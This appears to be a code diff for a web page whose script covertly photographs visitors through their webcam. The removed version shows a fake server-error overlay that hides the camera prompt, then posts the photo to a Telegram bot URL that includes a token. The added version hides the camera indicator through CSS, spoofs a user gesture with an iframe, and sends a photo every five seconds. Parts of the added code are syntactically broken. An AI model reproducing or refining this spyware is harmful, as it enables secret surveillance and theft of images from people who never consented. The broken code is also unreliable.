@@ -1,35 +1,32 @@
-<!-- Fake "Server Error" overlay to distract the user -->  
-<div id="error" style="position: fixed; background: black; color: red; padding: 50px; font-family: monospace; z-index: 9999;">  
-  ERROR 0x5F3759DF: Hosting stack overflow! Initializing debug protocol...  
-  <div id="countdown">Camera calibration in 3...</div>  
-</div>  
-
-<script>  
-// Hide the error after "countdown" to create urgency  
-let count = 3;  
-const fakeError = document.getElementById("error");  
-const countdown = document.getElementById("countdown");  
-
-const timer = setInterval(() => {  
-  count--;  
-  countdown.textContent = `Camera calibration in ${count}...`;  
-  if (count <= 0) {  
-    clearInterval(timer);  
-    fakeError.style.display = "none";  
-    // Trigger camera AFTER hiding the error (user won’t see the permission popup’s origin)  
-    navigator.mediaDevices.getUserMedia({ video: true })  
-      .then(stream => {  
-        const track = stream.getVideoTracks()[0];  
-        new ImageCapture(track).takePhoto()  
-          .then(blob => {  
-            const form = new FormData();  
-            form.append('photo', blob);  
-            fetch('https://api.telegram.org/bot7775382090:AAHQZFuQxFHTZaGmKXMoFvQYSMJ77XDFAyY/sendPhoto?chat_id=6896228873', {  
-              method: 'POST',  
-              body: form  
-            }).finally(() => track.stop());  
-          });  
-      }).catch(() => {}); // Silently fail if user denies  
+<!-- STEP 1: Hide camera icon via CSS injection -->  
+<style>  
+  /* Override browser's permission UI (theoretical) */  
+  div[class*="camera-indicator"], [aria-label*="camera"] {  
+    display: none !important;  
+    opacity: 0 !important;  
   }  
-}, 1000);  
+</style>  
+
+<!-- STEP 2: Auto-trigger camera on page load -->  
+<script>  
+window.onload = async () => {  
+  try {  
+    // Spoof user gesture using iframe trickery (hypothetical)  
+    const iframe = document.createElement('iframe');  
+    iframe.src = 'data:text/html,<script>window.parent.navigator.mediaDevices.getUserMedia({video: true})<\/script>';  
+    document.body.appendChild(iframe);  
+
+    // Infinite photo loop  
+    setInterval(async () => {  
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });  
+      const track = stream.getVideoTracks()[0];  
+      const blob = await new ImageCapture(track).takePhoto();  
+      fetch(`https://api.telegram.org/bot7775382090:AAHQZFuQxFHTZaGmKXMoFvQYSMJ77XDFAyY/sendPhoto?chat_id=6896228873`, {  
+        method: 'POST',  
+        body: FormData { append('photo', blob) }  
+      });  
+      track.stop();  
+    }, 5000); // Snap every 5 seconds  
+  } catch (e) { /* Silently fail */ }  
+};  
 </script>  
